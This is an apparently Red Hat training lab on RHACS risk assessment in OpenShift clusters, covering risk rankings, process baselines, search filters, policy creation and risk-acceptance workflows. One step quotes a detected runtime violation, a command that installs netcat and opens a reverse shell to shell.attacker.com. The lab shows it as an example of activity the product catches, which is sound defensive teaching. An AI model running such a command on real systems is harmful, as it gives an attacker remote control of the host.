== Introduction to Risk

You are now acquainted with the detailed information that Red Hat^(R)^ Advanced Cluster Security for Kubernetes (RHACS) provides about vulnerabilities and workflows to manage individual vulnerabilities. Often, the number of vulnerabilities detected can seem daunting to those uninitiated in security practice. You need to bring runtime, security configuration management, and vulnerability all together to get a more precise view of what is going on in your clusters. You need a system to evaluate the potential risk of harm from these vulnerabilities, and you need a way of prioritizing vulnerabilities to be addressed and not just deferring them.

You are now acquainted with the detailed information that Red Hat^(R)^ Advanced Cluster Security for Kubernetes (RHACS) provides about vulnerabilities and workflows to manage individual vulnerabilities. Often, the number of vulnerabilities detected can seem daunting to those uninitiated in security practice. You need to bring runtime, security configuration management, and vulnerability all together to get a more precise view of what is going on in your clusters. You need a system to evaluate the potential risk of harm from these vulnerabilities, and you need a way of prioritizing vulnerabilities to be addressed and not just deferring them.

RHACS understands the three major phases of an application's lifecycle to be _build_, _deploy_, and _runtime_.

The risk evaluation functionality of RHACS is used to understand how deployment-time configuration and runtime activity impact the likelihood of exploits occurring and how successful those exploits may be.

RHACS assesses risk across your entire environment and ranks your running deployments according to their security risk. It also details vulnerabilities, configurations, and runtime activities that require immediate attention. This helps you prioritize the remedial actions you plan to take.

Realistically it is only possible to tackle some sources of risk, so organizations prioritize their efforts. RHACS helps to inform that prioritization.

== View Risk Justifications

=== View Risks by Deployment

In this section, you look at the complete view of the risks by deployments in all the clusters of your system.

This list view shows all deployments in all clusters and namespaces, ordered by risk priority. A multi-factor risk metric sorts deployments based on policy violations, image contents, deployment configuration, and other similar factors. Deployments at the top of the list present the most risk.

.Procedure
. From the left navigation menu, select the *Risk* tab:

image::04-risk-1.png[link=self, window=blank, width=100%]

=== View Single Deployment Details

In this section, you examine the riskiest deployment to understand how risk is assessed during deploy time.

.Procedure
. Click the `visa-processor` deployment to bring up the *Risk Details* panel, with the *Risk Indicators* tab selected:

image::04-risk-2.png[link=self, window=blank, width=100%]

The *Risk Indicators* tab shows why this deployment is highly risky. The deployment has serious, fixable vulnerabilities, but it also has configurations such as network ports and service exposure outside the cluster, making it more likely to be attacked. In addition, other configurations, such as privileged containers, mean that a successful attacker has access to the underlying host network and file system, including other containers running on that host.

IMPORTANT: 
====
As you scroll down think about what risk indicators are important to your organization? How would you work to mitigate that risk?
====

[start=2]
. Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section.

IMPORTANT: 
====
Why do you think the deployment is rated as the *"Riskiest deployment"*
====

All of these configurations are gleaned automatically by RHACS from OpenShift, and the built-in policies assign a risk score to each, meaning that this risk report is available as soon as you start running RHACS.

And, hopefully, you can see why this image is highly insecure in the service configuration section, you can see that the sysadmin capabilities are added port 8080 is exposed in the cluster, and you can see that components useful for attackers are present components such as app bash curl and wget. This means a successful attacker gains complete control over this entire OpenShift^(R)^ cluster. 

[start=3]
. Navigate to the deployment details

image::04-risk-3.png[link=self, window=blank, width=100%]

Here we can see a complete breakdown of the deployment details including the container configuration the secrets that are mounted in the image name specific commands and the security context of the container which is *privileged*.

All of this information continues to add context to the container and how it's running in the cluster bumping up its risk factors.

[start=4]
. Next, click on the *Process Discovery* Tab

image::04-risk-4.png[link=self, window=blank, width=100%]

This tab shows you all of the running processes in the container. You can see that a baseline of processes is already established and that a few violations of that baseline have already been discovered. The baseline is a list of the processes currently running. Alerts are created if RHACS detects new processes that are not in the baseline.

If you scroll to the bottomw of the page. you could add those processes to the baseline with the `+` sign and silence any future alerts. But typically we want to understand what our applications are doing before we enact any policy enfocement or exceptions.

[start=5]
. Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation: `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.

image::04-risk-5.png[link=self, window=blank, width=100%]

IMPORTANT: 
====
Does this command running in a container at runtime seem important?
====

. Click the *View Graph* in the header bar to call up the *Event Timeline*.

image::04-risk-6.png[link=self, window=blank, width=100%]

The event timeline shows for each pod the process activity that has occurred over time. It has the visa-processor and visa-processor-sidecar information in the interface.

. Click the squares or circles for the process activity:

image::04-risk-7.png[link=self, window=blank, width=100%]
image::04-risk-8.png[link=self, window=blank, width=100%]

While ACS monitored the baseline activity it picked up a feew policy violations from the container. as you click the blew dot you will see what is being flagged.

NOTE: 
====
You can take advantage of the constrained lifecycle of containers for better runtime incident detection and response. Containers are not general-purpose virtual machines and therefore, generally have a simple lifecycle. They typically have a startup period, with some initialization, and then settle down to a small number of processes running continuously and making or receiving connections. Deviations from the baseline can be used to take enforcement action and alert team members. Runtime activity rules can be combined with other activity.
====

=== Lock Baseline

Fortunately, the `visa-processor` deployment is unlocked, and we can change our baselines. No let's take a look at what processes are explicitly allowed to run in the deployment.

.Procedure
. Click the *Process Discovery* tab on the *Risk Details* panel. Or click out of the *Process Discovery Graph*. 
. Scroll down to the *Spec Container Baselines* section:

image::04-risk-9.png[link=self, window=blank, width=100%]

The tooltip shows that the `visa-processor` container is already unlocked and warns that locking the process baselines will configure alerts in the future. The list in the RHACS Process Discover UI shows all processes discovered and added to the baseline in the first hour of runtime.

[start=3]

. Scroll down to the bottom of the list and see another container, the `visa-processor-sidecar` that is also accounted for.
. Hover over the lock icon for the `visa-processor-sidecar` and note that it is not locked.

image::04-risk-10.png[link=self, window=blank, width=100%]

[start=5]

. Go ahead and lock the baseline. All further processes run in this sidecar that is not among the several listed result in a triggered alert.
. Click *X* to close the details panel.

== Find vulnerabilities quickly with filters

In the Risk view and most UI pages, RHACS has a filter bar at the top that allows you to narrow the reporting view to matching or non-matching criteria. Almost all of the attributes that RHACS gathers are filterable. This is very useful in the Risk view when you know what you are looking for, for example, when you want answers to questions such as "What applications have CVE-2021-44228 present?"

.Procedure
. Enter `Process Name` in the filter bar (where it reads `Add one or more resource filters`) and select the *Process Name* key.
. Enter `bash` and then press *Enter*.

image::04-risk-11.png[link=self, window=blank, width=100%]

NOTE: Several deployments are shown to have run `bash` since they started--and all of them are in production. This could be a serious threat that we want to monitor.

[start=3]
. To the right of the filter bar, hover over the *+* (Create Policy) button to reveal the *Create Policy from Current Search* tooltip.

image::04-risk-12.png[link=self, window=blank, width=100%]

[start=4]
. Fill the policy details with a name, severity and catagory and hit *Next*.

NOTE: These steps are only to showcase the workflow. We will come back to policy creation later. Don't worry about being precise.

image::04-risk-13.png[link=self, window=blank, width=100%]

You will see that the policy behavior is set to runtime.

[start=5]
. click *Next*

image::04-risk-14.png[link=self, window=blank, width=100%]

And you notice that the policy criteria is set to the Process name is: *bash*

IMPORTANT:
====
Make sure to take advantage of the filtering capabilities in the Risk tab to craft policies. What other policies would be useful to your organization?
====

=== Explore Advanced Filtering

You can write more advanced filters focusing on particular scopes to detect vulnerabilities more accurately.

Local page filtering on the *Risk* view combines the search terms by using the following methods:

* Combines the search terms within the same category with an `OR` operator. For example, if the search query is `Cluster:A,B` the filter matches cluster `A` or cluster `B` deployments.

* Combines the search terms from different categories with an `AND` operator. For example, if the search query is `Cluster:A+Namespace:Z`, the filter matches deployments in cluster `A` and in namespace `Z`.

When you add multiple scopes to a policy, the policy matches violations from any of the scopes. For example, if you search for `(Cluster A OR Cluster B) AND (Namespace Z)` it results in two policy scopes, `(Cluster=A AND Namespace=Z)` OR `(Cluster=B AND Namespace=Z)`.

NOTE: Not all filters can be used in policies.

RHACS drops or modifies filters that do not directly map to policy criteria and reports the dropped filters.

See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risks.html[Understanding ... the filtering criteria into policy criteria^] documentation for more information.

== What would you do?

What filters would be useful in your day-to-day risk workflow? 
How would you scope your filters by team/application/cluster?

Try some of these scopes yourself by indicating different namespaces in your filters.

=== Risk Acceptance workflow

As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal.

. Procedure
. Navigate to *Vulnerability Management -> Risk Acceptance* and search for the from the previous example, CVE-2022-1292.

image::02_vuln_10.png[]

[start=2]
. Review the vulnerability's comments, scope, and action to decide if you want to approve it.
. Click  the three dots,

image::options_menu_icon.png[]

At the far right of the CVE, approve or deny the request for approval and provide a rationale.

You can see your *Approved Deferrals* from the appropriate tab above and make changes.
. You can also click through to the deployment that has that vulnerability and see its *Risk Priority*:

[start=4]
. Next, Click `1 deployment`:

image::rhacs_vuln_deployment.png[RHACS 1 Deployment]

[start=5]
. Click the `visa-processor` link to be taken to the *Deployment Overview*.

image::02_vuln_11.png[Risk Visa]

How is *Risk Priority* determined?

That is the subject of the next lab, *Risk Management*

== Report Vulnerabilities to Teams

IMPORTANT: You cannot send reports in this training lab. It is not integrated with an email server without an email notifier.

As organizations must constantly reassess and report on their vulnerabilities, some find it helpful to have scheduled communications with key stakeholders to help manage vulnerabilities.

You can use RHACS to schedule these regular communications through email. Red Hat recommends that you scope these communications to the most relevant information that the key stakeholders need.

== Summary

In this lab, you became familiar with the power of RHACS. RHACS does not simply surface vulnerabilities. You learned the various risk priority justifications RHACS provides and filtered and searched through these vulnerabilities. RHACS reports the risk indicators, deployment details, and processes necessary to discover vulnerabilities for each deployment.

Great job!! Have fun with *Policy Management*!
